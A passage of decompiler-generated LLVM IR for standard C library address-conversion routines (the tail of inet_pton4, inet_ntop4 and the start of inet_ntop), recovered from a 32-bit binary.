  %v1_804ff72 = inttoptr i32 %v0_804ff72 to i8*
  %v2_804ff72 = load i8, i8* %v1_804ff72, align 1
  %v3_804ff72 = sext i8 %v2_804ff72 to i32
  store i32 %v3_804ff72, i32* %eax.global-to-local, align 4
  %v2_804ff79 = call i32 @__GI_tolower(i32 %v3_804ff72)
  store i32 %v2_804ff79, i32* %eax.global-to-local, align 4
  %v1_804ff81 = icmp eq i32 %v2_804ff79, 0
  store i32 %v2_804ff79, i32* @esi, align 4
  %v1_804ff85 = icmp eq i1 %v1_804ff81, false
  br i1 %v1_804ff85, label %dec_label_pc_804feb9, label %dec_label_pc_804ff8b

dec_label_pc_804ff8b:                             ; preds = %dec_label_pc_804ff72
  br i1 %v4_804feee, label %dec_label_pc_804ffa9, label %dec_label_pc_804ff92

dec_label_pc_804ff92:                             ; preds = %dec_label_pc_804ff8b
  %v0_804ff92 = load i32, i32* @ebx, align 4
  %v1_804ff92 = add i32 %v0_804ff92, 2
  store i32 %v1_804ff92, i32* @edx, align 4
  %v6_804ff99 = icmp ugt i32 %v1_804ff92, %v2_804fe92
  br i1 %v6_804ff99, label %dec_label_pc_8050012, label %dec_label_pc_804ff9b

dec_label_pc_804ff9b:                             ; preds = %dec_label_pc_804ff92
  %v0_804ff9b = load i32, i32* @ebp, align 4
  %v2_804ff9d = udiv i32 %v0_804ff9b, 256
  %v4_804ff9d = trunc i32 %v2_804ff9d to i8
  %v3_804ffa0 = inttoptr i32 %v0_804ff92 to i8*
  store i8 %v4_804ff9d, i8* %v3_804ffa0, align 1
  %v0_804ffa2 = load i32, i32* @ebp, align 4
  store i32 %v0_804ffa2, i32* %eax.global-to-local, align 4
  %v1_804ffa4 = trunc i32 %v0_804ffa2 to i8
  %v2_804ffa4 = load i32, i32* @ebx, align 4
  %v3_804ffa4 = add i32 %v2_804ffa4, 1
  %v4_804ffa4 = inttoptr i32 %v3_804ffa4 to i8*
  store i8 %v1_804ffa4, i8* %v4_804ffa4, align 1
  %v0_804ffa7 = load i32, i32* @edx, align 4
  store i32 %v0_804ffa7, i32* @ebx, align 4
  br label %dec_label_pc_804ffa9

dec_label_pc_804ffa9:                             ; preds = %dec_label_pc_804ff8b, %dec_label_pc_804ff54, %dec_label_pc_804ff9b
  %v4_804ffa9 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804ffa9 = icmp eq i8* %stack_var_-44.1, null
  %v0_804ffe1.pre = load i32, i32* @ebx, align 4
  br i1 %v5_804ffa9, label %dec_label_pc_804ffe1, label %dec_label_pc_804ffb0

dec_label_pc_804ffb0:                             ; preds = %dec_label_pc_804ffa9
  store i32 1, i32* @esi, align 4
  %v6_804ffb7 = sub i32 %v0_804ffe1.pre, %v4_804ffa9
  store i32 %v6_804ffb7, i32* @edi, align 4
  %v16_804ffbb = icmp eq i32 %v0_804ffe1.pre, %v2_804fe92
  %v1_804ffbf = icmp eq i1 %v16_804ffbb, false
  br i1 %v1_804ffbf, label %dec_label_pc_804ffd9.preheader, label %dec_label_pc_8050012

dec_label_pc_804ffd9.preheader:                   ; preds = %dec_label_pc_804ffb0
  %v3_804ffd988 = inttoptr i32 %v6_804ffb7 to i8*
  %v9_804ffdb97 = icmp slt i8* %v3_804ffd988, inttoptr (i32 1 to i8*)
  br i1 %v9_804ffdb97, label %dec_label_pc_804ffdd, label %dec_label_pc_804ffc3

dec_label_pc_804ffc3:                             ; preds = %dec_label_pc_804ffd9.preheader, %dec_label_pc_804ffc3
  %v0_804ffd199 = phi i32 [ %v0_804ffd9.pre, %dec_label_pc_804ffc3 ], [ 1, %dec_label_pc_804ffd9.preheader ]
  %v0_804ffc398 = phi i32 [ %v1_804ffd9.pre, %dec_label_pc_804ffc3 ], [ %v6_804ffb7, %dec_label_pc_804ffd9.preheader ]
  %v2_804ffc9 = sub i32 %v0_804ffc398, %v0_804ffd199
  %v6_804ffcb = add i32 %v2_804ffc9, %v4_804ffa9
  store i32 %v6_804ffcb, i32* %eax.global-to-local, align 4
  %v2_804ffcf = sub i32 %v2_804fe92, %v0_804ffd199
  store i32 %v2_804ffcf, i32* @ecx, align 4
  %v1_804ffd1 = add i32 %v0_804ffd199, 1
  store i32 %v1_804ffd1, i32* @esi, align 4
  %v1_804ffd2 = inttoptr i32 %v6_804ffcb to i8*
  %v2_804ffd2 = load i8, i8* %v1_804ffd2, align 1
  %v3_804ffd2 = zext i8 %v2_804ffd2 to i32
  %v4_804ffd2 = load i32, i32* @edx, align 4
  %v5_804ffd2 = and i32 %v4_804ffd2, -256
  %v6_804ffd2 = or i32 %v5_804ffd2, %v3_804ffd2
  store i32 %v6_804ffd2, i32* @edx, align 4
  %v3_804ffd4 = inttoptr i32 %v2_804ffcf to i8*
  store i8 %v2_804ffd2, i8* %v3_804ffd4, align 1
  %v0_804ffd6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ffd6 = inttoptr i32 %v0_804ffd6 to i8*
  store i8 0, i8* %v1_804ffd6, align 1
  %v0_804ffd9.pre = load i32, i32* @esi, align 4
  %v1_804ffd9.pre = load i32, i32* @edi, align 4
  %v2_804ffd9 = inttoptr i32 %v0_804ffd9.pre to i8*
  %v3_804ffd9 = inttoptr i32 %v1_804ffd9.pre to i8*
  %v9_804ffdb = icmp sgt i8* %v2_804ffd9, %v3_804ffd9
  br i1 %v9_804ffdb, label %dec_label_pc_804ffdd, label %dec_label_pc_804ffc3

dec_label_pc_804ffdd:                             ; preds = %dec_label_pc_804ffc3, %dec_label_pc_804ffd9.preheader
  br label %dec_label_pc_804ffe1

dec_label_pc_804ffe1:                             ; preds = %dec_label_pc_804ffa9, %dec_label_pc_804ffdd
  %v0_804ffe1 = phi i32 [ %v2_804fe92, %dec_label_pc_804ffdd ], [ %v0_804ffe1.pre, %dec_label_pc_804ffa9 ]
  %v16_804ffe1 = icmp eq i32 %v0_804ffe1, %v2_804fe92
  %v1_804ffe5 = icmp eq i1 %v16_804ffe1, false
  br i1 %v1_804ffe5, label %dec_label_pc_8050012, label %dec_label_pc_804ffe7

dec_label_pc_804ffe7:                             ; preds = %dec_label_pc_804ffe1
  store i32 %v2_804fe86, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_804fff3 = call i32 @memcpy(i16* %tmp63, i32 %v2_804fe86, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050014

dec_label_pc_8050002:                             ; preds = %dec_label_pc_804fe66
  %v1_8050002 = call i32 @__errno_location(i32 %v0_804fe55)
  %v1_8050007 = inttoptr i32 %v1_8050002 to i32*
  store i32 97, i32* %v1_8050007, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050014

dec_label_pc_8050012:                             ; preds = %dec_label_pc_804ff13, %dec_label_pc_804ff0a, %dec_label_pc_804fece, %dec_label_pc_804fef5, %dec_label_pc_804ffb0, %dec_label_pc_804ff54, %dec_label_pc_804ffe1, %dec_label_pc_804ff92, %dec_label_pc_804ff47, %dec_label_pc_804ff3e, %dec_label_pc_804fea1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050014

dec_label_pc_8050014:                             ; preds = %dec_label_pc_8050002, %dec_label_pc_804ffe7, %dec_label_pc_804fe71, %dec_label_pc_8050012
  %v0_805001b = phi i32 [ -1, %dec_label_pc_8050002 ], [ 1, %dec_label_pc_804ffe7 ], [ %v3_804fe77, %dec_label_pc_804fe71 ], [ 0, %dec_label_pc_8050012 ]
  store i32 %v0_804fe55, i32* @ebx, align 4
  store i32 %v0_804fe54, i32* @esi, align 4
  store i32 %v0_804fe53, i32* @edi, align 4
  store i32 %v0_804fe52, i32* @ebp, align 4
  ret i32 %v0_805001b

; uselistorder directives
  uselistorder i32 %v1_804ffd9.pre, { 1, 0 }
  uselistorder i32 %v0_804ffd9.pre, { 1, 0 }
  uselistorder i32 %v0_804ffd199, { 2, 1, 0 }
  uselistorder i32 %v0_804ffe1.pre, { 1, 0, 2 }
  uselistorder i32 %v2_804ff79, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_804fe92, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_804fe55, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8050014, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050012, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_804ffe1, { 1, 0 }
  uselistorder label %dec_label_pc_804ffc3, { 1, 0 }
  uselistorder label %dec_label_pc_804ffa9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ff72, { 1, 0 }
  uselistorder label %dec_label_pc_804ff32, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ff72.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_805001d = load i32, i32* @edi, align 4
  %v0_805001e = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_8050022 = ptrtoint i32* %stack_var_-76 to i32
  %v0_8050025 = load i32, i32* @eax, align 4
  %v3_8050029 = and i32 %v0_8050025, -65536
  %v2_805002f = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_8050034 = load i32, i32* @edx, align 4
  %v5_8050034 = inttoptr i32 %v0_8050034 to i8*
  store i8* %v5_8050034, i8** %stack_var_-56, align 4
  %v0_8050038 = load i32, i32* @ecx, align 4
  store i32 %v3_8050029, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8050043 = add i32 %v2_805002f, 4
  store i32 %v6_8050043, i32* %edi.global-to-local, align 4
  %v2_8050044 = inttoptr i32 %v6_8050043 to i32*
  store i32 0, i32* %v2_8050044, align 4
  %v3_8050044 = load i32, i32* %edi.global-to-local, align 4
  %v6_8050044 = add i32 %v3_8050044, 4
  store i32 %v6_8050044, i32* %edi.global-to-local, align 4
  %v0_8050045 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050045 = inttoptr i32 %v6_8050044 to i32*
  store i32 %v0_8050045, i32* %v2_8050045, align 4
  %v3_8050045 = load i32, i32* %edi.global-to-local, align 4
  %v6_8050045 = add i32 %v3_8050045, 4
  store i32 %v6_8050045, i32* %edi.global-to-local, align 4
  %v0_8050046 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050046 = trunc i32 %v0_8050046 to i16
  %v3_8050046 = inttoptr i32 %v6_8050045 to i16*
  store i16 %v1_8050046, i16* %v3_8050046, align 2
  %v4_8050046 = load i32, i32* %edi.global-to-local, align 4
  %v7_8050046 = add i32 %v4_8050046, 2
  %v0_8050048 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050048 = trunc i32 %v0_8050048 to i8
  %v3_8050048 = inttoptr i32 %v7_8050046 to i8*
  store i8 %v1_8050048, i8* %v3_8050048, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_80500e330 = load i32, i32* @esi, align 4
  %v10_80500e336 = icmp eq i32 %v0_80500e330, 3
  store i1 %v10_80500e336, i1* %zf.global-to-local, align 1
  %v7_80500e638 = icmp sgt i32 %v0_80500e330, 3
  br i1 %v7_80500e638, label %dec_label_pc_80500ec, label %dec_label_pc_8050050

dec_label_pc_8050050:                             ; preds = %dec_label_pc_80500c3, %entry
  %v3_8050066 = phi i32 [ 0, %entry ], [ %v1_80500ec.pre, %dec_label_pc_80500c3 ]
  %v0_80500e339 = phi i32 [ %v0_80500e330, %entry ], [ %v0_80500e3, %dec_label_pc_80500c3 ]
  %v2_8050056 = add i32 %v0_80500e339, %v0_8050025
  %v12_8050056 = icmp eq i32 %v2_8050056, 0
  store i1 %v12_8050056, i1* %zf.global-to-local, align 1
  store i32 %v2_8050056, i32* %ebp.global-to-local, align 4
  %v1_8050058 = inttoptr i32 %v2_8050056 to i8*
  %v2_8050058 = load i8, i8* %v1_8050058, align 1
  %v3_8050058 = zext i8 %v2_8050058 to i32
  %v4_8050058 = load i32, i32* @edx, align 4
  %v5_8050058 = and i32 %v4_8050058, -65536
  %v6_8050058 = or i32 %v5_8050058, %v3_8050058
  store i32 %v6_8050058, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_8050058, 100
  %v6_805005f = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_8050058, 100
  %v12_805005f = zext i8 %tmp24 to i32
  %v14_805005f = mul nuw nsw i32 %v12_805005f, 256
  %v15_805005f = or i32 %v6_805005f, %v5_8050058
  %v16_805005f = or i32 %v15_805005f, %v14_805005f
  store i32 %v16_805005f, i32* %eax.global-to-local, align 4
  %v2_8050063 = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_8050066 = load i32, i32* @esp, align 4
  %v4_8050066 = add i32 %v2_8050066, 43
  %v5_8050066 = add i32 %v4_8050066, %v3_8050066
  %v6_8050066 = inttoptr i32 %v5_8050066 to i8*
  store i8 %v2_8050063, i8* %v6_8050066, align 1
  %v0_805006a = load i32, i32* %edi.global-to-local, align 4
  %v1_805006a = add i32 %v0_805006a, 1
  store i32 %v0_805006a, i32* @ecx, align 4
  %v0_8050073 = load i32, i32* @esp, align 4
  %v2_8050073 = add i32 %v0_805006a, 43
  %v3_8050073 = add i32 %v2_8050073, %v0_8050073
  %v4_8050073 = inttoptr i32 %v3_8050073 to i8*
  %v5_8050073 = load i8, i8* %v4_8050073, align 1
  %v11_8050073 = icmp eq i8 %v5_8050073, 48
  store i1 %v11_8050073, i1* %zf.global-to-local, align 1
  %v1_8050078 = icmp eq i1 %v11_8050073, false
  %v0_80500a2 = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_8050078, label %dec_label_pc_80500a0, label %dec_label_pc_805007a

dec_label_pc_805007a:                             ; preds = %dec_label_pc_8050050
  %v3_805007e = trunc i32 %v0_80500a2 to i16
  %v5_805007e = udiv i16 %v3_805007e, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_805007e, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_8050090 = trunc i16 %tmp42 to i8
  %v2_8050090 = or i8 %v1_8050090, 48
  %v12_8050090 = zext i8 %v2_8050090 to i32
  store i32 %v12_8050090, i32* %eax.global-to-local, align 4
  %v7_8050092 = icmp eq i8 %v1_8050090, 0
  store i1 %v7_8050092, i1* %zf.global-to-local, align 1
  store i8 %v2_8050090, i8* %v4_8050073, align 1
  %v0_8050098 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8050098, label %dec_label_pc_80500c3, label %dec_label_pc_805009a

dec_label_pc_805009a:                             ; preds = %dec_label_pc_805007a
  store i32 %v1_805006a, i32* @ecx, align 4
  br label %dec_label_pc_80500c3

dec_label_pc_80500a0:                             ; preds = %dec_label_pc_8050050
  store i32 %v1_805006a, i32* %ebx.global-to-local, align 4
  %v3_80500a8 = trunc i32 %v0_80500a2 to i16
  %v5_80500a8 = udiv i16 %v3_80500a8, 10
  %tmp43 = urem i16 %v5_80500a8, 256
  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_80500b8 = add i32 %v0_805006a, 2
  store i32 %v1_80500b8, i32* @ecx, align 4
  %v1_80500bd = trunc i16 %tmp44 to i8
  %v2_80500bd = or i8 %v1_80500bd, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_80500bd = zext i8 %v2_80500bd to i32
  store i32 %v12_80500bd, i32* %eax.global-to-local, align 4
  %v4_80500bf = add i32 %v0_805006a, 44
  %v5_80500bf = add i32 %v4_80500bf, %v0_8050073
  %v6_80500bf = inttoptr i32 %v5_80500bf to i8*
  store i8 %v2_80500bd, i8* %v6_80500bf, align 1
  br label %dec_label_pc_80500c3

dec_label_pc_80500c3:                             ; preds = %dec_label_pc_805007a, %dec_label_pc_805009a, %dec_label_pc_80500a0
  %v0_80500c3 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80500c3 = inttoptr i32 %v0_80500c3 to i8*
  %v2_80500c3 = load i8, i8* %v1_80500c3, align 1
  %v3_80500c3 = zext i8 %v2_80500c3 to i32
  store i32 %v3_80500c3, i32* %eax.global-to-local, align 4
  %v0_80500cc = load i32, i32* @esi, align 4
  %v1_80500cc = add i32 %v0_80500cc, 1
  store i32 %v1_80500cc, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_80500d1 = load i32, i32* @esp, align 4
  %v1_80500d1 = load i32, i32* @ecx, align 4
  %v2_80500d1 = add i32 %v0_80500d1, 44
  %v3_80500d1 = add i32 %v2_80500d1, %v1_80500d1
  %v4_80500d1 = inttoptr i32 %v3_80500d1 to i8*
  store i8 46, i8* %v4_80500d1, align 1
  %v0_80500d6 = load i32, i32* @ecx, align 4
  %v1_80500d6 = add i32 %v0_80500d6, 2
  store i32 %v1_80500d6, i32* %edi.global-to-local, align 4
  %v0_80500d9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80500d9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80500d9 = zext i32 %v1_80500d9 to i64
  %v3_80500d9 = load i32, i32* %edx.global-to-local, align 4
  %v4_80500d9 = zext i32 %v3_80500d9 to i64
  %v5_80500d9 = mul nuw i64 %v4_80500d9, 4294967296
  %v6_80500d9 = or i64 %v5_80500d9, %v2_80500d9
  %v7_80500d9 = zext i32 %v0_80500d9 to i64
  %v8_80500d9 = udiv i64 %v6_80500d9, %v7_80500d9
  %v9_80500d9 = trunc i64 %v8_80500d9 to i32
  %v10_80500d9 = urem i64 %v6_80500d9, %v7_80500d9
  %v11_80500d9 = trunc i64 %v10_80500d9 to i32
  store i32 %v11_80500d9, i32* @edx, align 4
  %v3_80500db = and i32 %v9_80500d9, -256
  %v1_80500dd = trunc i64 %v10_80500d9 to i8
  %v2_80500dd = add i8 %v1_80500dd, 48
  %v12_80500dd = zext i8 %v2_80500dd to i32
  %v15_80500dd = or i32 %v12_80500dd, %v3_80500db
  store i32 %v15_80500dd, i32* %eax.global-to-local, align 4
  %v2_80500df = load i32, i32* @esp, align 4
  %v4_80500df = add i32 %v0_80500d6, 43
  %v5_80500df = add i32 %v4_80500df, %v2_80500df
  %v6_80500df = inttoptr i32 %v5_80500df to i8*
  store i8 %v2_80500dd, i8* %v6_80500df, align 1
  %v0_80500e3 = load i32, i32* @esi, align 4
  %v10_80500e3 = icmp eq i32 %v0_80500e3, 3
  store i1 %v10_80500e3, i1* %zf.global-to-local, align 1
  %v7_80500e6 = icmp sgt i32 %v0_80500e3, 3
  %v1_80500ec.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_80500e6, label %dec_label_pc_80500ec, label %dec_label_pc_8050050

dec_label_pc_80500ec:                             ; preds = %dec_label_pc_80500c3, %entry
  %v1_80500ec = phi i32 [ 0, %entry ], [ %v1_80500ec.pre, %dec_label_pc_80500c3 ]
  %v0_80500ec = load i32, i32* @esp, align 4
  %v2_80500ec = add i32 %v0_80500ec, 42
  %v3_80500ec = add i32 %v2_80500ec, %v1_80500ec
  %v4_80500ec = inttoptr i32 %v3_80500ec to i8*
  store i8 0, i8* %v4_80500ec, align 1
  %v0_80500f1 = load i32, i32* @esp, align 4
  %v9_80500f1 = icmp eq i32 %v0_80500f1, 12
  store i1 %v9_80500f1, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_80500f9 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_80500f9, i32* @eax, align 4
  %v15_8050101 = icmp eq i32 %v3_80500f9, %v0_8050038
  store i1 %v15_8050101, i1* %zf.global-to-local, align 1
  %tmp45 = icmp ugt i32 %v3_80500f9, %v0_8050038
  br i1 %tmp45, label %dec_label_pc_8050107, label %dec_label_pc_8050116

dec_label_pc_8050107:                             ; preds = %dec_label_pc_80500ec
  %v0_8050107 = load i8*, i8** %stack_var_-92, align 4
  %v1_8050107 = ptrtoint i8* %v0_8050107 to i32
  %v2_8050107 = call i32 @__errno_location(i32 %v1_8050107)
  %v1_805010c = inttoptr i32 %v2_8050107 to i32*
  store i32 28, i32* %v1_805010c, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050125.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050125

dec_label_pc_8050116:                             ; preds = %dec_label_pc_80500ec
  %v2_80500f4 = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_80501194 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_80501194, i32* %tmp29, align 4
  %v0_805011d.cast = inttoptr i32 %v3_80501194 to i8*
  %v4_805011d = call i32 @strcpy(i8* %v0_805011d.cast, i32 %v2_80500f4)
  store i32 %v4_805011d, i32* %eax.global-to-local, align 4
  %v0_8050122 = load i32, i32* @esp, align 4
  %v6_8050122 = icmp eq i32 %v0_8050122, -16
  store i1 %v6_8050122, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8050125

dec_label_pc_8050125:                             ; preds = %dec_label_pc_8050107, %dec_label_pc_8050116
  %v0_805012c = phi i32 [ 0, %dec_label_pc_8050107 ], [ %v4_805011d, %dec_label_pc_8050116 ]
  %v0_8050125 = phi i32 [ %v0_8050125.pre, %dec_label_pc_8050107 ], [ %v15_8050022, %dec_label_pc_8050116 ]
  %v9_8050125 = icmp eq i32 %v0_8050125, -60
  store i1 %v9_8050125, i1* %zf.global-to-local, align 1
  store i32 %v0_805001e, i32* @esi, align 4
  store i32 %v0_805001d, i32* @edi, align 4
  ret i32 %v0_805012c

; uselistorder directives
  uselistorder i32 %v0_80500e3, { 2, 0, 1 }
  uselistorder i8 %v2_80500bd, { 1, 0 }
  uselistorder i32 %v0_80500a2, { 1, 0 }
  uselistorder i1 %v11_8050073, { 1, 0 }
  uselistorder i32 %v1_805006a, { 1, 0 }
  uselistorder i32 %v5_8050058, { 1, 0 }
  uselistorder i32 %v0_80500e330, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 17, 18, 19, 8, 10, 11, 7, 9, 2, 12, 6, 13, 14, 15, 16, 20, 30, 31, 3, 25, 21, 4, 22, 23, 24, 26, 27, 5, 28, 29 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 2, 3, 4, 0, 1 }
  uselistorder i8 48, { 8, 4, 5, 0, 6, 9, 10, 1, 7, 2, 3 }
  uselistorder label %dec_label_pc_8050125, { 1, 0 }
  uselistorder label %dec_label_pc_80500c3, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_805012e = load i32, i32* @edi, align 4
  %v0_805012f = load i32, i32* @esi, align 4
  %v0_8050130 = load i32, i32* @ebx, align 4
  %v15_8050131 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8050138 = icmp eq i32 %arg1, 2
  br i1 %v9_8050138, label %dec_label_pc_8050148, label %dec_label_pc_805013d

dec_label_pc_805013d:                             ; preds = %entry
  %v9_805013d = icmp eq i32 %arg1, 10
  %v1_8050140 = icmp eq i1 %v9_805013d, false
  br i1 %v1_8050140, label %dec_label_pc_80502e7, label %dec_label_pc_8050160

dec_label_pc_8050148:                             ; preds = %entry
  %v4_8050148 = ptrtoint i8* %arg3 to i32
  store i32 %v4_8050148, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8050154 = call i32 @inet_ntop4(i32 %v0_8050130, i32 %v0_805012f, i32 %v0_805012e)
  store i32 %v3_8050154, i32* %eax.global-to-local, align 4
  store i32 %v3_8050154, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80502f4

dec_label_pc_8050160:                             ; preds = %dec_label_pc_805013d
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8050165 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8050165, i32* %eax.global-to-local, align 4
  %tmp42 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp42, i8** %stack_var_-124, align 4
  %v6_805016a = call i32 @__GI_memset(i8* %tmp42, i32 0, i32 32)
  store i32 %v6_805016a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_805018c = add i32 %arg2, 1
  br label %dec_label_pc_8050176

dec_label_pc_8050176:                             ; preds = %dec_label_pc_8050176.dec_label_pc_8050176_crit_edge, %dec_label_pc_8050160
  %v1_8050199 = phi i32 [ %v15_8050131, %dec_label_pc_8050160 ], [ %v1_8050199.pre, %dec_label_pc_8050176.dec_label_pc_8050176_crit_edge ]
  %v0_805019169 = phi i32 [ 0, %dec_label_pc_8050160 ], [ %v0_805019d.pre, %dec_label_pc_8050176.dec_label_pc_8050176_crit_edge ]
  %v1_805017f = ashr i32 %v0_805019169, 31
  %v2_8050180 = zext i32 %v0_805019169 to i64
  %v4_8050180 = zext i32 %v1_805017f to i64
  %v5_8050180 = mul nuw i64 %v4_8050180, 4294967296
  %v6_8050180 = or i64 %v5_8050180, %v2_8050180
  %v8_8050180 = sdiv i64 %v6_8050180, 2
  %v9_8050180 = trunc i64 %v8_8050180 to i32
  store i32 %v9_8050180, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8050180, i32* %ebx.global-to-local, align 4
  %v2_8050188 = add i32 %v0_805019169, %arg2
  %v3_8050188 = inttoptr i32 %v2_8050188 to i8*
  %v4_8050188 = load i8, i8* %v3_8050188, align 1
  %v5_8050188 = zext i8 %v4_8050188 to i32
  store i32 %v5_8050188, i32* %eax.global-to-local, align 4
  %v3_805018c = add i32 %v2_805018c, %v0_805019169
  %v4_805018c = inttoptr i32 %v3_805018c to i8*
  %v5_805018c = load i8, i8* %v4_805018c, align 1
  %v6_805018c = zext i8 %v5_805018c to i32
  store i32 %v6_805018c, i32* %edx.global-to-local, align 4
  %v1_8050191 = add i32 %v0_805019169, 2
  store i32 %v1_8050191, i32* %ecx.global-to-local, align 4
  %v2_8050194 = mul nuw nsw i32 %v5_8050188, 256
  %v2_8050197 = or i32 %v6_805018c, %v2_8050194
  store i32 %v2_8050197, i32* %eax.global-to-local, align 4
  %v3_8050199 = mul i32 %v9_8050180, 4
  %v4_8050199 = add i32 %v3_8050199, 60
  %v5_8050199 = add i32 %v4_8050199, %v1_8050199
  %v6_8050199 = inttoptr i32 %v5_8050199 to i32*
  store i32 %v2_8050197, i32* %v6_8050199, align 4
  %v0_805019d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_80501a0 = icmp sgt i32 %v0_805019d.pre, 15
  br i1 %v7_80501a0, label %dec_label_pc_80501a2, label %dec_label_pc_8050176.dec_label_pc_8050176_crit_edge

dec_label_pc_8050176.dec_label_pc_8050176_crit_edge: ; preds = %dec_label_pc_8050176
  %v1_8050199.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050176

dec_label_pc_80501a2:                             ; preds = %dec_label_pc_8050176
  %v4_8050160 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80501ac.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80501ac

dec_label_pc_80501ac:                             ; preds = %dec_label_pc_80501a2, %dec_label_pc_80501d9
  %v0_80501d968 = phi i32 [ 0, %dec_label_pc_80501a2 ], [ %v1_80501d9, %dec_label_pc_80501d9 ]
